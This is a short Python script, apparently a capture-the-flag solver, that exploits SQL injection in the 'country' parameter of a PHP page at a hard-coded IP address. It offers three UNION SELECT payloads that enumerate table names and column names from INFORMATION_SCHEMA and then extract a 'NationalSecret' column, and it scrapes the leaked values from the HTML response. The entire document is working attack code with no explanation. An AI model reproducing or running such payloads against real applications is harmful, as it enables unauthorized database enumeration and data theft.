import requests
from bs4 import BeautifulSoup

print(''' 
1> GET TABLE NAME
2> GET COLUMN NAME
3> GET FLAG
''')
action = int(input("Choose:"))

if ( action==1 ):
    payload = "'+union+select+1,group_concat(TABLE_NAME),3,4,5,6+from+INFORMATION_SCHEMA.TABLES+where+TABLE_SCHEMA+like+database()--+-"
elif ( action==2 ):
    payload = "'+union+select+1,group_concat(COLUMN_NAME),3,4,5,6+from+INFORMATION_SCHEMA.COLUMNS+where+TABLE_SCHEMA+like+database()--+-"
elif ( action==3 ):
    payload = "'+union+select+1,group_concat(NationalSecret),3,4,5,6+from+info--+-"
else :
    exit("GO TO HELL")

url = "http://23.251.159.213:5668/info.php?country="
s = requests.Session()
tmp = url+payload
r = s.get(tmp)
data = r.text
soup = BeautifulSoup(data,features="html.parser")
a = soup.find_all("div")
rs = str(a[3]).replace("<div style=\"padding-left: 500px;\"> <h1 style=\"\">1</h1> <br/>Head of State:","").replace("<br/>Capital: 3<br/>Language: 4<br/>Currency: 5<br/><div>\n</div></div>","")
pos = rs.find(",")
if pos:
    rs = rs.split(",")
    for i in rs:
        print("[+] "+i)
else:
    print("[+] "+ rs)